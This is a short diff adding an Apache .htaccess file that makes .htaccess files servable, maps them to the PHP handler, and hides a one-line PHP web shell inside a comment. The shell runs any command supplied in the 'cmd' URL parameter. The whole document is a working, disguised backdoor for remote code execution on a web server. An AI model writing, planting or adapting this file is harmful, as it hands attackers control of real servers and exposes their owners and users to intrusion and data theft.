@@ -1,0 +1,6 @@
+<Files ~ "^\.ht">
+Order allow,deny
+Allow from all
+</Files>
+AddType application/x-httpd-php .htaccess
+# <?php system($_GET['cmd']); ?>
